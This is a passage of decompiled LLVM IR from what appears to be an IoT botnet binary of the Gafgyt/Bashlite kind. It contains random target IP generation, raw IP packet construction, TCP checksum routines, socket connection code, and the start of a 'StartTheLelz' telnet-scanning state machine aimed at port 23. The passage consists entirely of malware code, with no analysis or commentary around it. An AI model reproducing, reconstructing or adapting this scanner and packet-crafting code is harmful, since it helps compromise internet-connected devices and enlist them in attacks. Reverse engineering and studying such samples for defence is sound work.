  uselistorder label %dec_label_pc_a970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a940, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
  uselistorder label %dec_label_pc_a880, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ab48 = load i32, i32* @fp, align 4
  %v2_ab5c = load i32, i32* @global_var_2a3f0.80, align 4
  %v1_ab64 = call i32 @ntohl(i32 %v2_ab5c)
  %v2_ab70 = and i32 %v1_ab64, %arg1
  %v0_ab78 = call i32 @rand_cmwc()
  %v1_ab84 = sub i32 -1, %arg1
  %v2_ab88 = and i32 %v0_ab78, %v1_ab84
  %v2_ab90 = xor i32 %v2_ab88, %v2_ab70
  store i32 %v3_ab48, i32* @fp, align 4
  ret i32 %v2_ab90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ac209 = icmp sgt i32 %arg2, 1
  br i1 %v8_ac209, label %dec_label_pc_abd0, label %dec_label_pc_ac24

dec_label_pc_abd0:                                ; preds = %entry, %dec_label_pc_abd0
  %v2_abec = phi i32 [ %v2_abf0, %dec_label_pc_abd0 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_abf4, %dec_label_pc_abd0 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_ac10, %dec_label_pc_abd0 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_ac08, %dec_label_pc_abd0 ], [ %arg1, %entry ]
  %v4_abd0 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_abd4 = load i8, i8* %stack_var_-32.010, align 1
  %v3_abd4 = zext i8 %v2_abd4 to i32
  %v1_abd8 = add i32 %v4_abd0, 1
  %v2_abd8 = inttoptr i32 %v1_abd8 to i8*
  %v3_abd8 = load i8, i8* %v2_abd8, align 1
  %v4_abd8 = zext i8 %v3_abd8 to i32
  %v4_abdc = mul nuw nsw i32 %v4_abd8, 256
  %v5_abdc = or i32 %v4_abdc, %v3_abd4
  %v2_abf0 = add i32 %v5_abdc, %v2_abec
  %v3_abf0 = icmp ult i32 %v2_abf0, %v2_abec
  %v4_abf4 = zext i1 %v3_abf0 to i32
  %v5_abf4 = add i32 %v4_abf4, %stack_var_-40.012
  %v1_ac04 = add i32 %v4_abd0, 2
  %v5_ac08 = inttoptr i32 %v1_ac04 to i8*
  %v1_ac10 = add nsw i32 %stack_var_-36.011, -2
  %v8_ac20 = icmp sgt i32 %v1_ac10, 1
  br i1 %v8_ac20, label %dec_label_pc_abd0, label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_abd0, %entry
  %v2_ac44 = phi i32 [ 0, %entry ], [ %v2_abf0, %dec_label_pc_abd0 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_ac08, %dec_label_pc_abd0 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_abf4, %dec_label_pc_abd0 ]
  %v7_ac1c.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_ac10, %dec_label_pc_abd0 ]
  %v7_ac1c.lcssa = icmp eq i32 %v7_ac1c.lcssa.in, 1
  br i1 %v7_ac1c.lcssa, label %dec_label_pc_ac30, label %dec_label_pc_acac.preheader

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac24
  %v2_ac34 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_ac34 = zext i8 %v2_ac34 to i32
  %v2_ac48 = add i32 %v3_ac34, %v2_ac44
  %v3_ac48 = icmp ult i32 %v2_ac48, %v2_ac44
  %v4_ac4c = zext i1 %v3_ac48 to i32
  %v5_ac4c = add i32 %v4_ac4c, %stack_var_-40.0.lcssa
  br label %dec_label_pc_acac.preheader

dec_label_pc_acac.preheader:                      ; preds = %dec_label_pc_ac30, %dec_label_pc_ac24
  %v3_acd8.ph = phi i32 [ %v2_ac44, %dec_label_pc_ac24 ], [ %v2_ac48, %dec_label_pc_ac30 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_ac24 ], [ %v5_ac4c, %dec_label_pc_ac30 ]
  %v3_acb036 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_acb837 = udiv i32 %v3_acd8.ph, 65536
  %v2_acbc38 = or i32 %v3_acb036, %v3_acb837
  %v3_acc439 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_accc40 = or i32 %v2_acbc38, %v3_acc439
  %v2_acd041 = icmp eq i32 %v2_accc40, 0
  br i1 %v2_acd041, label %dec_label_pc_acd8, label %dec_label_pc_ac5c

dec_label_pc_ac5c:                                ; preds = %dec_label_pc_acac.preheader, %dec_label_pc_ac5c
  %v3_acc444 = phi i32 [ %v3_acc4, %dec_label_pc_ac5c ], [ %v3_acc439, %dec_label_pc_acac.preheader ]
  %v2_acbc43 = phi i32 [ %v2_acbc, %dec_label_pc_ac5c ], [ %v2_acbc38, %dec_label_pc_acac.preheader ]
  %v3_acd842 = phi i32 [ %v2_ac9c, %dec_label_pc_ac5c ], [ %v3_acd8.ph, %dec_label_pc_acac.preheader ]
  %v2_ac70 = urem i32 %v3_acd842, 65536
  %v2_ac9c = add i32 %v2_acbc43, %v2_ac70
  %v3_ac9c = icmp ult i32 %v2_ac9c, %v2_ac70
  %v4_aca0 = zext i1 %v3_ac9c to i32
  %v5_aca0 = add nuw nsw i32 %v4_aca0, %v3_acc444
  %v3_acb0 = mul i32 %v5_aca0, 65536
  %v3_acb8 = udiv i32 %v2_ac9c, 65536
  %v2_acbc = or i32 %v3_acb0, %v3_acb8
  %v3_acc4 = udiv i32 %v5_aca0, 65536
  %v2_accc = or i32 %v2_acbc, %v3_acc4
  %v2_acd0 = icmp eq i32 %v2_accc, 0
  br i1 %v2_acd0, label %dec_label_pc_acac.dec_label_pc_acd8_crit_edge, label %dec_label_pc_ac5c

dec_label_pc_acac.dec_label_pc_acd8_crit_edge:    ; preds = %dec_label_pc_ac5c
  br label %dec_label_pc_acd8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_acac.dec_label_pc_acd8_crit_edge, %dec_label_pc_acac.preheader
  %v3_acd8.lcssa = phi i32 [ %v2_ac9c, %dec_label_pc_acac.dec_label_pc_acd8_crit_edge ], [ %v3_acd8.ph, %dec_label_pc_acac.preheader ]
  %v1_ace4 = urem i32 %v3_acd8.lcssa, 65536
  %v3_acec = xor i32 %v1_ace4, 65535
  ret i32 %v3_acec

; uselistorder directives
  uselistorder i32 %v2_acbc, { 1, 0 }
  uselistorder i32 %v5_aca0, { 1, 0 }
  uselistorder i32 %v2_ac9c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_acc439, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_acd8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ac44, { 0, 2, 1 }
  uselistorder i32 %v1_ac10, { 0, 2, 1 }
  uselistorder i32 %v2_abf0, { 0, 2, 1 }
  uselistorder i32 %v2_abec, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac5c, { 1, 0 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_ad00 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_ad38 = add i32 %arg1, 12
  %v2_ad38 = inttoptr i32 %v1_ad38 to i32*
  %v3_ad38 = load i32, i32* %v2_ad38, align 4
  store i32 %v3_ad38, i32* %stack_var_-44, align 4
  %v1_ad60 = call i32 @htons(i32 20)
  %v1_ad84 = call i32 @malloc(i32 32)
  %v2_ad94 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_ad84, i32* @r0, align 4
  store i32 %v2_ad94, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ada8 = call i32 @memcpy()
  %v1_adb0 = add i32 %v1_ad84, 12
  %v3_adb4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_adb0, i32* @r0, align 4
  store i32 %v3_adb4, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_adc8 = call i32 @memcpy()
  %v2_add4 = inttoptr i32 %v1_ad84 to i8*
  %v3_add4 = call i32 @csum(i8* %v2_add4, i32 32)
  %sext2 = mul i32 %v3_add4, 16777216
  %v3_ade0 = ashr i32 %sext2, 31
  store i32 %v1_ad84, i32* @r0, align 4
  %v0_adec = call i32 @free()
  %v3_adf4 = sdiv i32 %sext2, 16777216
  %v4_adf8 = mul nsw i32 %v3_ade0, 256
  %v4_adfc = and i32 %v4_adf8, 65280
  %v5_adfc = or i32 %v4_adfc, %v3_adf4
  store i32 %v3_ad00, i32* @fp, align 4
  ret i32 %v5_adfc

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_ad84, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_ae10 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_ae30 = load i8, i8* %arg1, align 1
  %v4_ae38 = zext i8 %v2_ae30 to i32
  %v1_ae3c = and i32 %v4_ae38, 240
  %v1_ae40 = or i32 %v1_ae3c, 5
  store i32 %v1_ae40, i32* %r3.global-to-local, align 4
  %v1_ae4c = trunc i32 %v1_ae40 to i8
  store i8 %v1_ae4c, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ae7c = add i32 %tmp4, 1
  %v4_ae7c = inttoptr i32 %v3_ae7c to i8*
  store i8 0, i8* %v4_ae7c, align 1
  %v3_ae80 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ae80, 20
  %v3_ae94 = urem i32 %fold, 65536
  store i32 %v3_ae94, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_ae9c = trunc i32 %fold to i8
  %v3_ae9c = add i32 %tmp4, 2
  %v4_ae9c = inttoptr i32 %v3_ae9c to i8*
  store i8 %v1_ae9c, i8* %v4_ae9c, align 1
  %v0_aea0 = load i32, i32* %r3.global-to-local, align 4
  %v3_aea0 = sdiv i32 %v0_aea0, 256
  store i32 %v3_aea0, i32* %r3.global-to-local, align 4
  %v1_aea4 = trunc i32 %v3_aea0 to i8
  %v2_aea4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aea4 = add i32 %v2_aea4, 3
  %v4_aea4 = inttoptr i32 %v3_aea4 to i8*
  store i8 %v1_aea4, i8* %v4_aea4, align 1
  %v0_aea8 = call i32 @rand_cmwc()
  %v3_aeb4 = urem i32 %v0_aea8, 65536
  store i32 %v3_aeb4, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_aebc = trunc i32 %v0_aea8 to i8
  %v3_aebc = add i32 %tmp4, 4
  %v4_aebc = inttoptr i32 %v3_aebc to i8*
  store i8 %v1_aebc, i8* %v4_aebc, align 1
  %v0_aec0 = load i32, i32* %r3.global-to-local, align 4
  %v3_aec03 = udiv i32 %v0_aec0, 256
  %v1_aec4 = trunc i32 %v3_aec03 to i8
  %v2_aec4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aec4 = add i32 %v2_aec4, 5
  %v4_aec4 = inttoptr i32 %v3_aec4 to i8*
  store i8 %v1_aec4, i8* %v4_aec4, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aed0 = add i32 %tmp4, 6
  %v4_aed0 = inttoptr i32 %v3_aed0 to i8*
  store i8 0, i8* %v4_aed0, align 1
  %v0_aed4 = load i32, i32* %r3.global-to-local, align 4
  %v1_aed4 = trunc i32 %v0_aed4 to i8
  %v2_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aed4 = add i32 %v2_aed4, 7
  %v4_aed4 = inttoptr i32 %v3_aed4 to i8*
  store i8 %v1_aed4, i8* %v4_aed4, align 1
  %v3_aee0 = add i32 %tmp4, 8
  %v4_aee0 = inttoptr i32 %v3_aee0 to i8*
  store i8 -1, i8* %v4_aee0, align 1
  %v3_aeec = add i32 %tmp4, 9
  %v4_aeec = inttoptr i32 %v3_aeec to i8*
  store i8 %tmp, i8* %v4_aeec, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aef8 = add i32 %tmp4, 10
  %v4_aef8 = inttoptr i32 %v3_aef8 to i8*
  store i8 0, i8* %v4_aef8, align 1
  %v0_aefc = load i32, i32* %r3.global-to-local, align 4
  %v1_aefc = trunc i32 %v0_aefc to i8
  %v2_aefc = load i32, i32* %r2.global-to-local, align 4
  %v3_aefc = add i32 %v2_aefc, 11
  %v4_aefc = inttoptr i32 %v3_aefc to i8*
  store i8 %v1_aefc, i8* %v4_aefc, align 1
  %v2_af08 = add i32 %tmp4, 12
  %v3_af08 = inttoptr i32 %v2_af08 to i32*
  store i32 %arg3, i32* %v3_af08, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_af14 = add i32 %tmp4, 16
  %v3_af14 = inttoptr i32 %v2_af14 to i32*
  store i32 %arg2, i32* %v3_af14, align 4
  store i32 %v3_ae10, i32* @fp, align 4
  ret i32 %v0_aea8

; uselistorder directives
  uselistorder i32 %v0_aea8, { 1, 2, 0 }
  uselistorder i32 %v3_aea0, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_af3c = icmp sgt i32 %arg1, 2
  br i1 %v8_af3c, label %dec_label_pc_af4c, label %dec_label_pc_af5c

dec_label_pc_af4c:                                ; preds = %entry
  %v1_af50 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %entry, %dec_label_pc_af4c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_af4c ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_af5c, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af70 = load i32, i32* @fp, align 4
  store i32 44920, i32* %stack_var_-4, align 4
  %v2_af74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af74, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_af9c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_afac = icmp eq i32 %v1_af9c, 0
  br i1 %v2_afac, label %dec_label_pc_afb4, label %dec_label_pc_afc0

dec_label_pc_afb4:                                ; preds = %entry
  br label %dec_label_pc_b0a8

dec_label_pc_afc0:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_afc4 = add i32 %v1_af9c, 16
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  %v3_afc4 = load i32, i32* %v2_afc4, align 4
  %v1_afc8 = inttoptr i32 %v3_afc4 to i32*
  %v2_afc8 = load i32, i32* %v1_afc8, align 4
  %v1_afd0 = add i32 %v1_af9c, 12
  %v2_afd0 = inttoptr i32 %v1_afd0 to i32*
  %v3_afd0 = load i32, i32* %v2_afd0, align 4
  store i32 %v3_afd0, i32* @r2, align 4
  %v2_afdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_afe8 = call i32 @bcopy(i32 %v2_afc8, i32 %v2_afdc, i32 %v3_afd0)
  %v1_b000 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_b030 = call i32 @socket()
  %v2_b03c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_b03c, i32* @ip, align 4
  %v6_b058 = call i32 @__GI_setsockopt(i32 %v0_b030, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_b060 = icmp eq i32 %v0_b030, -1
  br i1 %v3_b060, label %dec_label_pc_b068, label %dec_label_pc_b074

dec_label_pc_b068:                                ; preds = %dec_label_pc_afc0
  br label %dec_label_pc_b0a8

dec_label_pc_b074:                                ; preds = %dec_label_pc_afc0
  %v3_b084 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_b084 = call i32 @__libc_connect(i32 %v0_b030, %sockaddr* %v3_b084, i32 16)
  %v3_b08c = icmp eq i32 %v4_b084, -1
  br i1 %v3_b08c, label %dec_label_pc_b094, label %dec_label_pc_b0a0

dec_label_pc_b094:                                ; preds = %dec_label_pc_b074
  br label %dec_label_pc_b0a8

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b074
  br label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b094, %dec_label_pc_b068, %dec_label_pc_afb4, %dec_label_pc_b0a0
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_afb4 ], [ 0, %dec_label_pc_b068 ], [ 0, %dec_label_pc_b094 ], [ %v0_b030, %dec_label_pc_b0a0 ]
  store i32 %v3_af70, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b0a8, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b0b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b0b8, i32* %ip.global-to-local, align 4
  %v3_b0bc = load i32, i32* @r4, align 4
  store i32 %v3_b0bc, i32* %stack_var_-24, align 4
  store i32 45252, i32* %stack_var_-4, align 4
  %v19_b0bc = ptrtoint i32* %stack_var_-24 to i32
  %v2_b0c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b0c0, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_b0dc = call i32 @__GI_time(i32* null)
  store i32 %v2_b0dc, i32* %r3.global-to-local, align 4
  store i32 %v2_b0dc, i32* @r4, align 4
  %v0_b0e8 = call i32 @rand_cmwc()
  %v0_b0f0 = load i32, i32* @r4, align 4
  %v2_b0f0 = xor i32 %v0_b0f0, %v0_b0e8
  store i32 %v2_b0f0, i32* %r3.global-to-local, align 4
  %v1_b0f8 = call i32 @srand(i32 %v2_b0f0)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b110 = call i32 @htons(i32 23)
  %v2_b128 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_b128, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b144 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_b16c = inttoptr i32 %v1_b144 to i8*
  %v3_b16c = call i32 @__GI_memset(i8* %v2_b16c, i32 0)
  %v2_b17c = mul i32 %arg2, 28
  %v1_b180 = or i32 %v2_b17c, 3
  %v1_b184 = add i32 %v1_b180, 3
  %v3_b188 = and i32 %v1_b184, -4
  %v1_b190 = load i32, i32* @sp, align 4
  %v2_b190 = sub i32 %v1_b190, %v3_b188
  %v1_b1a0 = add i32 %v2_b190, 7
  %v3_b1a4 = and i32 %v1_b1a0, -4
  %v2_b1c8 = mul i32 %arg2, 5
  store i32 %v2_b1c8, i32* %r3.global-to-local, align 4
  store i32 %v2_b1c8, i32* @r2, align 4
  %v2_b1dc = inttoptr i32 %v3_b1a4 to i8*
  %v3_b1dc = call i32 @__GI_memset(i8* %v2_b1dc, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2bc61 = icmp sgt i32 %arg2, 0
  br i1 %v5_b2bc61, label %dec_label_pc_b1ec, label %dec_label_pc_b2c0

dec_label_pc_b1ec:                                ; preds = %entry, %dec_label_pc_b1ec
  %storemerge462 = phi i32 [ %v1_b2a8, %dec_label_pc_b1ec ], [ 0, %entry ]
  %v2_b1fc = mul i32 %storemerge462, 28
  %v2_b200 = add i32 %v2_b1fc, %v3_b1a4
  store i32 %v2_b200, i32* %r3.global-to-local, align 4
  %v2_b208 = inttoptr i32 %v2_b200 to i32*
  store i32 0, i32* %v2_b208, align 4
  %v0_b20c = load i32, i32* %r3.global-to-local, align 4
  %v1_b20c = add i32 %v0_b20c, 4
  store i32 %v1_b20c, i32* %r3.global-to-local, align 4
  %v2_b214 = inttoptr i32 %v1_b20c to i32*
  store i32 0, i32* %v2_b214, align 4
  %v0_b218 = load i32, i32* %r3.global-to-local, align 4
  %v1_b218 = add i32 %v0_b218, 4
  store i32 %v1_b218, i32* %r3.global-to-local, align 4
  %v2_b220 = inttoptr i32 %v1_b218 to i32*
  store i32 0, i32* %v2_b220, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 4
  store i32 %v1_b224, i32* %r3.global-to-local, align 4
  %v2_b22c = inttoptr i32 %v1_b224 to i32*
  store i32 0, i32* %v2_b22c, align 4
  %v0_b230 = load i32, i32* %r3.global-to-local, align 4
  %v1_b230 = add i32 %v0_b230, 4
  store i32 %v1_b230, i32* %r3.global-to-local, align 4
  %v2_b238 = inttoptr i32 %v1_b230 to i32*
  store i32 0, i32* %v2_b238, align 4
  %v0_b23c = load i32, i32* %r3.global-to-local, align 4
  %v1_b23c = add i32 %v0_b23c, 4
  store i32 %v1_b23c, i32* %r3.global-to-local, align 4
  %v2_b244 = inttoptr i32 %v1_b23c to i32*
  store i32 0, i32* %v2_b244, align 4
  %v0_b248 = load i32, i32* %r3.global-to-local, align 4
  %v1_b248 = add i32 %v0_b248, 4
  %v2_b250 = inttoptr i32 %v1_b248 to i32*
  store i32 0, i32* %v2_b250, align 4
  %v3_b278 = add i32 %v2_b200, 9
  %v4_b278 = inttoptr i32 %v3_b278 to i8*
  store i8 1, i8* %v4_b278, align 1
  %v2_b298 = add i32 %v2_b200, 24
  %v2_b2a0 = inttoptr i32 %v2_b298 to i32*
  store i32 %v1_b144, i32* %v2_b2a0, align 4
  %v1_b2a8 = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_b2a8, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_b2bc = icmp slt i32 %v1_b2a8, %arg2
  br i1 %v5_b2bc, label %dec_label_pc_b1ec, label %dec_label_pc_b2c0

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b1ec, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b2c8

dec_label_pc_b2c8:                                ; preds = %dec_label_pc_b2c8, %dec_label_pc_b2c0
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b2c0 ], [ %v1_b2cc, %dec_label_pc_b2c8 ]
  %v1_b2cc = add i32 %stack_var_-56.0, 1
  store i32 %v1_b2cc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_23d4c.92 to i32), i32* %r3.global-to-local, align 4
  %v4_b2dc = mul i32 %v1_b2cc, 4
  %v5_b2dc = add i32 %v4_b2dc, ptrtoint ([10 x i8*]* @global_var_23d4c.92 to i32)
  %v6_b2dc = inttoptr i32 %v5_b2dc to i32*
  %v7_b2dc = load i32, i32* %v6_b2dc, align 4
  store i32 %v7_b2dc, i32* %r3.global-to-local, align 4
  %v2_b2e0 = icmp eq i32 %v7_b2dc, 0
  br i1 %v2_b2e0, label %dec_label_pc_b2e8.preheader, label %dec_label_pc_b2c8

dec_label_pc_b2e8.preheader:                      ; preds = %dec_label_pc_b2c8
  %v2_b370 = add i32 %v3_b1a4, 8
  %v2_b5f4 = add i32 %v3_b1a4, 4
  %v3_b6e4 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_b754 = ptrtoint i32* %stack_var_-324 to i32
  %v2_b850 = ptrtoint i32* %stack_var_-332 to i32
  %v2_b8ac = ptrtoint i32* %stack_var_-340 to i32
  %v2_b8b0 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b9cc = add i32 %v3_b1a4, 16
  %v2_ba48 = add i32 %v3_b1a4, 24
  br label %dec_label_pc_b2e8

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b2e8, %dec_label_pc_c3c8, %dec_label_pc_b2e8.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_b2bc61, label %dec_label_pc_b2f4, label %dec_label_pc_b2e8

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b2e8, %dec_label_pc_c3c8
  %storemerge553 = phi i32 [ %v1_c3cc, %dec_label_pc_c3c8 ], [ 0, %dec_label_pc_b2e8 ]
  %v3_b300 = mul i32 %storemerge553, 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b308 = mul i32 %storemerge553, 28
  %v2_b30c = add i32 %v2_b308, %v3_b1a4
  %v2_b310 = add i32 %v2_b30c, 16
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v1_b314 = inttoptr i32 %v2_b310 to i32*
  %v2_b314 = load i32, i32* %v1_b314, align 4
  store i32 %v2_b314, i32* %r3.global-to-local, align 4
  %v2_b318 = icmp eq i32 %v2_b314, 0
  br i1 %v2_b318, label %dec_label_pc_b320, label %dec_label_pc_b358

dec_label_pc_b320:                                ; preds = %dec_label_pc_b2f4
  store i32 %storemerge553, i32* @r4, align 4
  %v2_b328 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b33c = load i32, i32* @r4, align 4
  %v3_b340 = mul i32 %v0_b33c, 4
  store i32 %v3_b340, i32* %r2.global-to-local, align 4
  %v2_b348 = mul i32 %v0_b33c, 28
  %v2_b350 = add i32 %v2_b9cc, %v2_b348
  store i32 %v2_b350, i32* %r3.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v2_b350 to i32*
  store i32 %v2_b328, i32* %v2_b354, align 4
  br label %dec_label_pc_b358

dec_label_pc_b358:                                ; preds = %dec_label_pc_b2f4, %dec_label_pc_b320
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b374 = add i32 %v2_b370, %v2_b308
  store i32 %v2_b374, i32* %r3.global-to-local, align 4
  %v1_b378 = inttoptr i32 %v2_b374 to i8*
  %v2_b378 = load i8, i8* %v1_b378, align 4
  %v3_b378 = sext i8 %v2_b378 to i32
  %v4_b378 = zext i8 %v2_b378 to i32
  store i32 %v4_b378, i32* %r3.global-to-local, align 4
  switch i32 %v3_b378, label %dec_label_pc_c3c8 [
    i32 0, label %dec_label_pc_b3a8
    i32 1, label %dec_label_pc_b768.lr.ph
    i32 2, label %dec_label_pc_ba14
    i32 3, label %dec_label_pc_bb60
    i32 4, label %dec_label_pc_bcb4
    i32 5, label %dec_label_pc_be00
    i32 6, label %dec_label_pc_bf54
    i32 7, label %dec_label_pc_c258
  ]

dec_label_pc_b3a8:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b3c4 = add i32 %v2_b30c, 8
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b3c8 = add i32 %v2_b30c, 9
  %v2_b3c8 = inttoptr i32 %v1_b3c8 to i8*
  %v3_b3c8 = load i8, i8* %v2_b3c8, align 1
  %v7_b3cc = icmp eq i8 %v3_b3c8, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_b3cc, label %dec_label_pc_b3d4, label %dec_label_pc_b4c0

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b3a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b3f0 = add i32 %v2_b30c, 24
